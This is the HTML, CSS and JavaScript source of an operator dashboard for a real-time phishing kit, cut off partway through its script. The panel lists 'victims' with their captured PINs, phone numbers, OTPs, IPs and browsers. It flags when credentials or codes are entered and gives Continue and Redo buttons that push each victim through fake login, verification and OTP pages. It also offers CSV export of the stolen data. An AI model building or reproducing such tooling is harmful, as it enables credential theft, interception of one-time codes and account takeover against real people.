<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>$$$</title>
  <link rel="preconnect" href="https://rsms.me">
  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
  <style>
    :root {
      --bg: #000000;
      --card-bg: rgba(11, 11, 11, 0.65);
      --card-border: rgba(255,255,255,0.08);
      --card-border-hover: rgba(255,255,255,0.18);
      --text-primary: #f5f5f5;
      --text-muted: #a0a0a0;
      --green: #34d399;
      --red: #fb7185;
      --blue: #60a5fa;
      --yellow: #fbbf24;
      --radius: 22px;
      --input-bg: rgba(6, 6, 6, 0.5);
      --table-border: rgba(255,255,255,0.08);
      --table-hover: rgba(255,255,255,0.03);
      --cred-bg: rgba(255,255,255,0.08);
      --cred-color: #fff;
      --glass-blur: blur(20px);
      --glass-saturation: saturate(180%);
      --shadow-color: rgba(0,0,0,0.4);
    }
    
    [data-theme="light"] {
      --bg: #f5f5f5;
      --card-bg: rgba(255, 255, 255, 0.72);
      --card-border: rgba(0,0,0,0.08);
      --card-border-hover: rgba(0,0,0,0.15);
      --text-primary: #1a1a1a;
      --text-muted: #666666;
      --input-bg: rgba(240, 240, 240, 0.6);
      --table-border: rgba(0,0,0,0.06);
      --table-hover: rgba(0,0,0,0.02);
      --cred-bg: rgba(0,0,0,0.06);
      --cred-color: #000;
      --glass-blur: blur(20px);
      --glass-saturation: saturate(180%);
      --shadow-color: rgba(0,0,0,0.15);
    }

    /* Theme 1 - Ocean Teal (Default) */
    [data-theme="theme1"] {
      --bg: transparent;
      --card-bg: rgba(20, 40, 60, 0.55);
      --card-border: rgba(100, 200, 200, 0.15);
      --card-border-hover: rgba(100, 220, 220, 0.3);
      --text-primary: #e8f4f8;
      --text-muted: #7fb3c8;
      --green: #4ade80;
      --red: #f87171;
      --blue: #38bdf8;
      --yellow: #fbbf24;
      --input-bg: rgba(10, 30, 50, 0.5);
      --table-border: rgba(100, 200, 200, 0.1);
      --table-hover: rgba(100, 200, 200, 0.08);
      --cred-bg: rgba(0, 150, 150, 0.15);
      --cred-color: #a5f3fc;
      --glass-blur: blur(24px);
      --glass-saturation: saturate(200%);
      --shadow-color: rgba(0, 30, 60, 0.5);
      --accent-glow: 0 0 40px rgba(45, 212, 191, 0.3);
    }

    /* Theme 2 - Deep (GREEN) */
    [data-theme="theme2"] {
      --bg: transparent;
      --card-bg: rgba(10, 40, 25, 0.6);
      --card-border: rgba(100, 200, 100, 0.12);
      --card-border-hover: rgba(120, 220, 120, 0.28);
      --text-primary: #f0fdf4;
      --text-muted: #86c9a0;
      --green: #4ade80;
      --red: #f87171;
      --blue: #38bdf8;
      --yellow: #fbbf24;
      --input-bg: rgba(5, 30, 15, 0.5);
      --table-border: rgba(100, 200, 100, 0.08);
      --table-hover: rgba(100, 200, 100, 0.06);
      --cred-bg: rgba(34, 197, 94, 0.15);
      --cred-color: #86efac;
      --glass-blur: blur(26px);
      --glass-saturation: saturate(200%);
      --shadow-color: rgba(0, 40, 20, 0.5);
      --accent-glow: 0 0 40px rgba(34, 197, 94, 0.3);
    }

    /* Theme 3 - Forest (BLUE) */
    [data-theme="theme3"] {
      --bg: transparent;
      --card-bg: rgba(15, 25, 50, 0.6);
      --card-border: rgba(100, 150, 255, 0.12);
      --card-border-hover: rgba(100, 170, 255, 0.25);
      --text-primary: #f0f4ff;
      --text-muted: #8aa4c8;
      --green: #4ade80;
      --red: #f87171;
      --blue: #60a5fa;
      --yellow: #fbbf24;
      --input-bg: rgba(10, 20, 40, 0.5);
      --table-border: rgba(100, 150, 255, 0.08);
      --table-hover: rgba(100, 150, 255, 0.06);
      --cred-bg: rgba(60, 130, 246, 0.15);
      --cred-color: #93c5fd;
      --glass-blur: blur(28px);
      --glass-saturation: saturate(220%);
      --shadow-color: rgba(0, 20, 60, 0.6);
      --accent-glow: 0 0 40px rgba(59, 130, 246, 0.3);
    }

    /* Theme 4 - Magenta Dream (MORE PURPLE) */
    [data-theme="theme4"] {
      --bg: transparent;
      --card-bg: rgba(45, 20, 55, 0.6);
      --card-border: rgba(180, 100, 220, 0.15);
      --card-border-hover: rgba(200, 120, 240, 0.32);
      --text-primary: #faf5ff;
      --text-muted: #c4a5e0;
      --green: #a78bfa;
      --red: #f472b6;
      --blue: #c084fc;
      --yellow: #fbbf24;
      --input-bg: rgba(35, 15, 45, 0.55);
      --table-border: rgba(160, 90, 200, 0.1);
      --table-hover: rgba(160, 90, 200, 0.08);
      --cred-bg: rgba(139, 92, 246, 0.2);
      --cred-color: #ddd6fe;
      --glass-blur: blur(28px);
      --glass-saturation: saturate(240%);
      --shadow-color: rgba(45, 15, 60, 0.55);
      --accent-glow: 0 0 45px rgba(168, 85, 247, 0.4);
    }
    
    *{box-sizing:border-box;font-family:InterVariable,Inter,system-ui,sans-serif}
    
    body {
      margin:0;
      background:var(--bg);
      color:var(--text-primary);
      transition:all 0.5s ease;
      min-height:100vh;
      position:relative;
    }

    /* Background layers */
    .bg-layer {
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      z-index:-2;
      background-size:cover;
      background-position:center;
      background-repeat:no-repeat;
      transition:opacity 0.8s ease;
      opacity:0;
    }
    .bg-layer.active {
      opacity:1;
    }

    /* Glass overlay for better readability */
    .bg-overlay {
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      z-index:-1;
      background:rgba(0,0,0,0.2);
      backdrop-filter:blur(0px);
      transition:all 0.5s ease;
    }

    [data-theme="light"] .bg-overlay {
      background:rgba(255,255,255,0.1);
    }

    [data-theme="theme1"] .bg-overlay,
    [data-theme="theme2"] .bg-overlay,
    [data-theme="theme3"] .bg-overlay,
    [data-theme="theme4"] .bg-overlay {
      background:rgba(0,0,0,0.35);
      backdrop-filter:blur(2px);
    }
    
    .greet-bar{max-width:1120px;margin:32px auto 0;padding:0 28px;font-size:20px;font-weight:600;line-height:1.05;display:flex;justify-content:space-between;align-items:center}
    .greet-left{display:flex;align-items:center;gap:8px}
    .greet-right{display:flex;align-items:center;gap:12px}
    .dashboard{max-width:1120px;margin:24px auto 64px;padding:0 28px}
    .grid{display:grid;gap:22px}
    
    .card {
      position:relative;
      background:var(--card-bg);
      border:1px solid var(--card-border);
      border-radius:var(--radius);
      padding:22px;
      transition:all 240ms cubic-bezier(.2,.8,.2,1);
      backdrop-filter:var(--glass-blur) var(--glass-saturation);
      -webkit-backdrop-filter:var(--glass-blur) var(--glass-saturation);
      box-shadow:0 8px 32px var(--shadow-color), inset 0 1px 0 rgba(255,255,255,0.1);
    }
    
    .card:hover {
      transform:translateY(-3px);
      border-color:var(--card-border-hover);
      box-shadow:0 18px 48px var(--shadow-color), var(--accent-glow, 0 0 0 transparent), inset 0 1px 0 rgba(255,255,255,0.15);
    }
    
    .stats{grid-template-columns:repeat(3,1fr)}.stat-label{font-size:11px;font-weight:500;letter-spacing:.18em;text-transform:uppercase;color:var(--text-muted)}.stat-value{margin-top:12px;font-size:34px;font-weight:600;line-height:1.05}
    
    table{width:100%;font-size:.9rem;border-collapse:collapse;margin-top:1rem}
    th{text-align:left;padding:.6rem .5rem;border-bottom:1px solid var(--table-border);font-weight:500;font-size:.8rem;text-transform:uppercase;color:var(--text-muted)}
    td{padding:.6rem .5rem;border-bottom:1px solid var(--card-border)}
    tr:hover{background:var(--table-hover)}
    
    .btn {
      padding:.35rem .75rem;
      font-size:.8rem;
      border-radius:10px;
      border:1px solid var(--card-border);
      background:rgba(128,128,128,0.08);
      color:var(--text-primary);
      cursor:pointer;
      transition:all .18s ease;
      backdrop-filter:blur(10px);
    }
    .btn:hover {
      background:rgba(128,128,128,0.15);
      border-color:var(--text-muted);
      transform:translateY(-1px);
    }
    
    .icon-btn {
      width:36px;
      height:36px;
      padding:8px;
      border-radius:10px;
      border:1px solid var(--card-border);
      background:rgba(128,128,128,0.08);
      cursor:pointer;
      transition:all .18s ease;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      backdrop-filter:blur(10px);
    }
    .icon-btn:hover {
      background:rgba(128,128,128,0.15);
      transform:scale(1.05) translateY(-1px);
    }
    .icon-btn img{width:18px;height:18px;filter:brightness(0) invert(1)}
    [data-theme="light"] .icon-btn img{filter:none}
    .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
    .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
    .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
    .icon-btn.skip{border-color:rgba(52,211,153,.4);background:rgba(52,211,153,.12)}
    .icon-btn.skip:hover{background:rgba(52,211,153,.22)}
    .icon-btn.skip img{filter:brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(100deg)}
    
    .cred {
      font-family:monospace;
      font-size:.8rem;
      background:var(--cred-bg);
      padding:4px 8px;
      border-radius:6px;
      color:var(--cred-color);
      border:1px solid var(--card-border);
      backdrop-filter:blur(4px);
    }
    
    .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
    
    #modal, #settingsModal, #confirmModal {
      display:none;
      position:fixed;
      inset:0;
      background:rgba(0,0,0,.6);
      align-items:center;
      justify-content:center;
      z-index:1000;
      backdrop-filter:blur(8px);
    }
    #settingsModal{background:rgba(0,0,0,.7)}
    #confirmModal{z-index:1001}
    
    #modal .card, #settingsModal .card, #confirmModal .card {
      max-width:600px;
      width:90%;
      background:var(--card-bg);
      border-color:var(--card-border);
      max-height:90vh;
      overflow-y:auto;
      padding:28px;
      backdrop-filter:var(--glass-blur) var(--glass-saturation);
    }
    #settingsModal .card{max-width:420px}
    #confirmModal .card{max-width:380px;text-align:center}
    #empty{text-align:center;color:var(--text-muted);padding:2rem 0}

    .modal-header{border-bottom:1px solid var(--card-border);padding-bottom:16px;margin-bottom:20px}
    .modal-title{font-size:20px;font-weight:600;margin:0;color:var(--text-primary)}
    .modal-subtitle{font-size:13px;color:var(--text-muted);margin-top:4px}
    
    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px}
    .info-section {
      background:rgba(128,128,128,0.05);
      border-radius:14px;
      padding:16px;
      border:1px solid var(--card-border);
      backdrop-filter:blur(10px);
    }
    .info-label{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:6px;font-weight:500}
    .info-value{font-size:14px;color:var(--text-primary);font-weight:500}
    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(128,128,128,0.1);padding:4px 8px;border-radius:6px;display:inline-block;margin-top:2px}
    .info-value.small{font-size:12px;color:var(--text-muted);word-break:break-all;line-height:1.4}
    
    .full-width{grid-column:1 / -1}
    
    .activity-section{margin-top:20px;border-top:1px solid var(--card-border);padding-top:20px}
    .activity-title{font-size:12px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:12px;font-weight:600}
    .activity-log {
      max-height:220px;
      overflow-y:auto;
      background:rgba(128,128,128,0.03);
      border-radius:12px;
      padding:12px;
      border:1px solid var(--card-border);
      backdrop-filter:blur(5px);
    }
    .activity-item{padding:10px 0;border-bottom:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:flex-start}
    .activity-item:last-child{border-bottom:none;padding-bottom:0}
    .activity-item:first-child{padding-top:0}
    .activity-meta{flex:1}
    .activity-action{font-size:13px;color:var(--text-primary);font-weight:500;margin-bottom:2px}
    .activity-detail{font-size:12px;color:var(--text-muted)}
    .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:16px;font-family:monospace}

    .delete-section{margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:center}
    .delete-info{font-size:12px;color:var(--text-muted)}
    .btn-danger{background:rgba(251,113,133,.12);border-color:rgba(251,113,133,.4);color:var(--red);padding:8px 16px}
    .btn-danger:hover{background:rgba(251,113,133,.22)}
    .btn-secondary{background:rgba(128,128,128,0.08);border-color:var(--card-border)}

    #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}
    .alert {
      background:var(--card-bg);
      backdrop-filter:var(--glass-blur) var(--glass-saturation);
      border:1px solid var(--card-border);
      border-radius:14px;
      padding:16px 20px;
      box-shadow:0 10px 40px var(--shadow-color);
      animation:slideIn .3s ease,fadeOut .3s ease 4.7s;
      display:flex;
      align-items:center;
      gap:12px;
      cursor:pointer;
      transition:transform .2s ease;
    }
    .alert:hover{transform:translateX(-5px)}
    .alert-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
    .alert-content{flex:1}.alert-title{font-size:13px;font-weight:600;color:var(--text-primary);margin-bottom:2px}.alert-desc{font-size:12px;color:var(--text-muted)}.alert-time{font-size:11px;color:var(--text-muted);margin-top:4px}
    .alert-success{border-left:3px solid var(--green)}.alert-success .alert-icon{background:rgba(52,211,153,.12);color:var(--green)}
    .alert-warning{border-left:3px solid var(--yellow)}.alert-warning .alert-icon{background:rgba(251,191,36,.12);color:var(--yellow)}
    .alert-info{border-left:3px solid var(--blue)}.alert-info .alert-icon{background:rgba(96,165,250,.12);color:var(--blue)}
    .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.12);color:var(--red)}
    @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
    @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
    
    .ip-link{color:var(--blue);text-decoration:none;cursor:pointer;transition:opacity .2s}
    .ip-link:hover{opacity:.8;text-decoration:underline}
    
    tr.approved{opacity:.6;background:rgba(52,211,153,.03)}
    tr.approved td{color:var(--text-muted)}

    /* Settings styles */
    .settings-row{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--card-border)}
    .settings-row:last-child{border-bottom:none}
    .settings-label{font-size:14px;font-weight:500;color:var(--text-primary)}
    .settings-value{font-size:14px;color:var(--text-muted);font-family:monospace}
    
    .theme-toggle{display:flex;gap:4px;background:rgba(128,128,128,0.08);padding:4px;border-radius:10px;border:1px solid var(--card-border)}
    .theme-option{flex:1;padding:8px 12px;border-radius:8px;border:none;background:transparent;color:var(--text-muted);cursor:pointer;font-size:11px;font-weight:500;transition:all .2s;white-space:nowrap;}
    .theme-option.active{background:var(--card-bg);color:var(--text-primary);box-shadow:0 2px 12px var(--shadow-color);border:1px solid var(--card-border-hover);}
    
    /* Theme selector grid */
    .theme-grid {
      display:grid;
      grid-template-columns:repeat(4, 1fr);
      gap:8px;
      margin-top:8px;
    }
    .theme-thumb {
      aspect-ratio:1;
      border-radius:12px;
      border:2px solid transparent;
      cursor:pointer;
      transition:all 0.2s ease;
      position:relative;
      overflow:hidden;
      background-size:cover;
      background-position:center;
    }
    .theme-thumb:hover {
      transform:scale(1.05);
      border-color:var(--card-border-hover);
    }
    .theme-thumb.active {
      border-color:var(--blue);
      box-shadow:0 0 0 2px var(--blue), 0 4px 12px rgba(0,0,0,0.3);
    }
    .theme-thumb::after {
      content:attr(data-name);
      position:absolute;
      bottom:0;
      left:0;
      right:0;
      padding:4px;
      font-size:9px;
      text-align:center;
      background:rgba(0,0,0,0.6);
      color:#fff;
      backdrop-filter:blur(4px);
    }
    
    .delete-session-btn{width:100%;padding:12px;border-radius:10px;border:1px solid var(--red);background:rgba(251,113,133,.08);color:var(--red);cursor:pointer;font-size:13px;font-weight:600;transition:all .2s;margin-top:8px;backdrop-filter:blur(10px);}
    .delete-session-btn:hover{background:rgba(251,113,133,.18)}
    
    /* Confirm modal styles */
    .confirm-text{font-size:14px;color:var(--text-muted);margin-bottom:20px;line-height:1.5}
    .confirm-buttons{display:flex;gap:12px;justify-content:center}
    .confirm-btn{padding:10px 24px;border-radius:10px;border:1px solid var(--card-border);background:rgba(128,128,128,0.08);color:var(--text-primary);cursor:pointer;font-size:13px;font-weight:500;transition:all .2s;backdrop-filter:blur(10px);}
    .confirm-btn:hover{background:rgba(128,128,128,0.15)}
    .confirm-btn.danger{background:rgba(251,113,133,.12);border-color:var(--red);color:var(--red)}
    .confirm-btn.danger:hover{background:rgba(251,113,133,.22)}

    /* Multi-select styles */
    .select-col {width:40px;text-align:center}
    .checkbox-custom {
      width:18px;
      height:18px;
      border:2px solid var(--card-border);
      border-radius:4px;
      cursor:pointer;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      transition:all .2s;
      background:transparent;
    }
    .checkbox-custom:hover {border-color:var(--text-muted)}
    .checkbox-custom.checked {
      background:var(--red);
      border-color:var(--red);
    }
    .checkbox-custom.checked::after {
      content:'✓';
      color:#fff;
      font-size:12px;
      font-weight:bold;
    }
    .batch-actions {
      display:none;
      align-items:center;
      gap:12px;
      padding:12px 16px;
      background:var(--card-bg);
      border:1px solid var(--card-border);
      border-radius:12px;
      margin-bottom:16px;
      backdrop-filter:var(--glass-blur) var(--glass-saturation);
    }
    .batch-actions.active {display:flex}
    .batch-count {font-size:13px;color:var(--text-muted)}
    .batch-btn {
      padding:6px 14px;
      border-radius:8px;
      border:1px solid var(--red);
      background:rgba(251,113,133,.12);
      color:var(--red);
      cursor:pointer;
      font-size:12px;
      font-weight:500;
      transition:all .2s;
    }
    .batch-btn:hover {background:rgba(251,113,133,.22)}
    .select-all-btn {
      padding:4px 10px;
      border-radius:6px;
      border:1px solid var(--card-border);
      background:rgba(128,128,128,0.08);
      color:var(--text-muted);
      cursor:pointer;
      font-size:11px;
      transition:all .2s;
    }
    .select-all-btn:hover {background:rgba(128,128,128,0.15);color:var(--text-primary)}

    /* Mobile */
    @media (max-width: 768px) {
      .greet-bar{margin:16px auto 0;padding:0 16px;font-size:16px}
      .dashboard{margin:16px auto 32px;padding:0 16px}
      .stats{grid-template-columns:1fr;gap:12px}
      .stat-value{font-size:28px}
      .card{padding:16px;border-radius:16px}
      table{font-size:0.75rem;display:block;overflow-x:auto;white-space:nowrap;-webkit-overflow-scrolling:touch}
      th,td{padding:0.4rem 0.3rem}
      .cred{font-size:0.7rem;padding:3px 6px}
      .icon-btn{width:32px;height:32px;padding:6px}
      .icon-btn img{width:16px;height:16px}
      #modal .card, #settingsModal .card, #confirmModal .card{width:95%;padding:20px;border-radius:16px}
      .modal-title{font-size:18px}
      .info-grid{grid-template-columns:1fr;gap:12px}
      .info-section{padding:12px}
      .activity-log{max-height:180px}
      .activity-item{flex-direction:column;gap:4px}
      .activity-time{margin-left:0;margin-top:4px}
      #alert-container{left:16px;right:16px;max-width:none}
      .alert{padding:12px 16px}
      .delete-section{flex-direction:column;gap:12px;align-items:stretch}
      #logoutBtn{font-size:12px;padding:0.25rem 0.5rem}
      #exportBtn{position:relative !important;bottom:auto !important;right:auto !important;margin-top:8px;width:100% !important}
      .greet-right{gap:8px}
      .theme-grid{grid-template-columns:repeat(2, 1fr);}
      .theme-option{font-size:10px;padding:6px 8px;}
      .select-col {width:32px}
      .checkbox-custom {width:16px;height:16px}
      .batch-actions {flex-wrap:wrap;gap:8px}
      .batch-count {width:100%}
    }
    @media (max-width: 480px) {
      .greet-bar{font-size:14px}
      .stat-value{font-size:24px}
      .stat-label{font-size:10px}
      table{font-size:0.7rem}
      th,td{padding:0.3rem 0.2rem}
      td:nth-child(8),th:nth-child(8),td:nth-child(9),th:nth-child(9){display:none}
      .theme-grid{grid-template-columns:repeat(2, 1fr);}
    }
  </style>
</head>
<body>
  <!-- Background Layers -->
  <div class="bg-layer" id="bg1" style="background-image:url('/images/theme1.jpg')"></div>
  <div class="bg-layer" id="bg2" style="background-image:url('/images/theme2.jpg')"></div>
  <div class="bg-layer" id="bg3" style="background-image:url('/images/theme3.jpg')"></div>
  <div class="bg-layer" id="bg4" style="background-image:url('/images/theme4.jpg')"></div>
  <div class="bg-overlay"></div>

  <div id="alert-container"></div>

  <div class="greet-bar">
    <div class="greet-left">
      Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span>
    </div>
    <div class="greet-right">
      <button id="settingsBtn" class="icon-btn" title="Settings" style="width:auto;height:auto;padding:8px 12px;">
        <img src="/images/settings-svgrepo-com.svg" style="width:16px;height:16px;">
      </button>
      <button id="logoutBtn" class="btn">Logout</button>
    </div>
  </div>

  <div class="dashboard">
    <div class="grid stats">
      <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">—</div></div>
      <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">—</div></div>
      <div class="card">
        <div class="stat-label">Successful Logins</div>
        <div class="stat-value" id="success">—</div>
        <button id="exportBtn" class="btn" style="margin-top:8px;width:auto;font-size:11px;position:absolute;bottom:12px;right:12px;">Export CSV</button>
      </div>
    </div>

    <div class="card" style="margin-top:22px">
      <div style="font-size:14px;font-weight:600;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center">
        <span>Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:var(--blue);text-decoration:none"></a></span>
      </div>
      
      <div class="batch-actions" id="batchActions">
        <span class="batch-count"><span id="selectedCount">0</span> selected</span>
        <button class="batch-btn" onclick="deleteSelected()">Delete Selected</button>
        <button class="select-all-btn" onclick="clearSelection()">Clear</button>
      </div>
      
      <table id="tbl"><thead><tr>
        <th class="select-col"><div class="checkbox-custom" id="selectAllBox" onclick="toggleSelectAll()"></div></th>
        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
      </tr></thead><tbody></tbody></table>
      <div id="empty">No active sessions</div>
    </div>
  </div>

  <!-- Session Detail Modal -->
  <div id="modal" onclick="if(event.target===this)closeModal()">
    <div class="card">
      <div class="modal-header">
        <div style="display:flex;justify-content:space-between;align-items:flex-start">
          <div>
            <h3 class="modal-title" id="modalTitle">Session Details</h3>
            <div class="modal-subtitle" id="modalSubtitle">Victim #0 • Connected at --:--</div>
          </div>
          <button onclick="closeModal()" class="btn" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
        </div>
      </div>
      <div id="modalBody"></div>
    </div>
  </div>

  <!-- Settings Modal -->
  <div id="settingsModal" onclick="if(event.target===this)closeSettings()">
    <div class="card">
      <div class="modal-header">
        <div style="display:flex;justify-content:space-between;align-items:flex-start">
          <div>
            <h3 class="modal-title">Settings</h3>
          </div>
          <button onclick="closeSettings()" class="btn" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
        </div>
      </div>
      
      <div id="settingsBody">
        <!-- Current User -->
        <div class="settings-row">
          <div class="settings-label">Current User</div>
          <div class="settings-value" id="settingsUser">admin</div>
        </div>

        <!-- Session Statistics -->
        <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px">
          <div class="settings-label">Session Statistics</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
            <div class="stat-box" style="background:rgba(128,128,128,0.05);padding:12px;border-radius:10px;border:1px solid var(--card-border);backdrop-filter:blur(10px);">
              <div style="font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px">Visits (total)</div>
              <div style="font-size:20px;font-weight:600;color:var(--text-primary)" id="statTotal">0</div>
            </div>
            <div class="stat-box" style="background:rgba(128,128,128,0.05);padding:12px;border-radius:10px;border:1px solid var(--card-border);backdrop-filter:blur(10px);">
              <div style="font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px">Successful</div>
              <div style="font-size:20px;font-weight:600;color:var(--green)" id="statSuccess">0</div>
            </div>
          </div>
        </div>

        <!-- Theme Selection -->
        <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;">
          <div class="settings-label">Theme</div>
          <div class="theme-toggle">
            <button class="theme-option" id="themeDark" onclick="setTheme('dark')">Dark</button>
            <button class="theme-option" id="themeLight" onclick="setTheme('light')">Light</button>
          </div>
          <div class="theme-grid" id="themeGrid">
            <div class="theme-thumb" data-theme="theme1" data-name="Aurora" onclick="setTheme('theme1')" style="background-image:url('/images/theme1.jpg')"></div>
            <div class="theme-thumb" data-theme="theme2" data-name="Forest" onclick="setTheme('theme2')" style="background-image:url('/images/theme2.jpg')"></div>
            <div class="theme-thumb" data-theme="theme3" data-name="Ocean" onclick="setTheme('theme3')" style="background-image:url('/images/theme3.jpg')"></div>
            <div class="theme-thumb" data-theme="theme4" data-name="Dream" onclick="setTheme('theme4')" style="background-image:url('/images/theme4.jpg')"></div>
          </div>
        </div>

        <!-- Delete Session -->
        <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;padding-bottom:0">
          <div>
            <div class="settings-label" style="color:var(--red)">Delete Session</div>
            <div style="font-size:11px;color:var(--text-muted);margin-top:4px">Clear all active sessions and reset all data</div>
          </div>
          <button class="delete-session-btn" onclick="showConfirmDelete()">Delete All Sessions</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Confirm Delete Modal -->
  <div id="confirmModal" onclick="if(event.target===this)closeConfirm()">
    <div class="card">
      <div class="modal-title" style="margin-bottom:8px;color:var(--red)">⚠️ Delete All Sessions?</div>
      <div class="confirm-text">
        This will permanently delete all active sessions, victim data, and reset all counters.<br><br>
        This action cannot be undone.
      </div>
      <div class="confirm-buttons">
        <button class="confirm-btn" onclick="closeConfirm()">Cancel</button>
        <button class="confirm-btn danger" onclick="executeDelete()">Delete</button>
      </div>
    </div>
  </div>

  <script>
    let currentSid = null, jsonData = {}, lastSessions = new Map();
    let isFirstLoad = true;
    let selectedSessions = new Set();
    const qs = s => document.querySelector(s);
    const qsa = s => document.querySelectorAll(s);
    const fmt = t => new Date(t).toLocaleTimeString();
    const fmtDate = t => new Date(t).toLocaleString();

    /* ----------  THEME  ---------- */
    function loadTheme() {
      const saved = localStorage.getItem('panelTheme') || 'dark';
      setTheme(saved, false);
    }
    
    function setTheme(theme, save = true) {
      // Remove all theme attributes first
      document.documentElement.removeAttribute('data-theme');
      
      // Set new theme
      if (theme !== 'dark' && theme !== 'light') {
        document.documentElement.setAttribute('data-theme', theme);
      } else {
        document.documentElement.setAttribute('data-theme', theme);
      }
      
      // Update UI toggles
      qsa('.theme-option').forEach(el => el.classList.remove('active'));
      const themeBtn = qs(`#theme${theme.charAt(0).toUpperCase() + theme.slice(1)}`);
      if (themeBtn) themeBtn.classList.add('active');
      
      // Update background layers
      qsa('.bg-layer').forEach((el, i) => {
        el.classList.toggle('active', el.id === `bg${theme.replace('theme', '')}`);
      });
      
      // Update theme grid selection
      qsa('.theme-thumb').forEach(el => {
        el.classList.toggle('active', el.dataset.theme === theme);
      });
      
      if (save) localStorage.setItem('panelTheme', theme);
    }

    /* ----------  CLOCK  ---------- */
    function updateClock(){
      const now = new Date(), h = now.getHours(), m = now.getMinutes(), suffix = h >= 12 ? 'pm' : 'am';
      qs('#clock').textContent = `${h % 12 || 12}:${m.toString().padStart(2,'0')}${suffix}`;
    }
    updateClock(); setInterval(updateClock, 1000);

    /* ----------  ALERTS  ---------- */
    function showAlert(type, title, desc, victimNum){
      if (isFirstLoad) return;
      
      const container = qs('#alert-container');
      const alert = document.createElement('div');
      alert.className = `alert alert-${type}`;
      alert.innerHTML = `
        <div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕'}[type]}</div>
        <div class="alert-content">
          <div class="alert-title">${title}</div>
          <div class="alert-desc">${desc}</div>
          <div class="alert-time">Victim #${victimNum} • ${fmt(Date.now())}</div>
        </div>`;
      alert.onclick = () => alert.remove();
      container.appendChild(alert);
      setTimeout(() => alert.remove(), 5000);
    }

    /* ----------  STATUS  ---------- */
    function statusText(s){
      if (s.page==='success' || s.status==='approved') return '';
      if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
      if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
      if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
      if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">ENTERED OTP</div>';
      return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
    }

    /* ----------  ACTIONS  ---------- */
    function actionButtons(s){
      let html = '<div style="display:flex;gap:6px">';
      html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
      if (s.page === 'success' || s.status === 'approved') return html + '</div>';
      if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
      } else if (s.page === 'verify.html' && s.phone) {
        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
      } else if (s.page === 'unregister.html' && s.unregisterClicked) {
        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
      } else if (s.page === 'otp.html' && s.otp) {
        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
      }
      return html + '</div>';
    }

    /* ----------  CHANGES  ---------- */
    function checkChanges(newSessions){
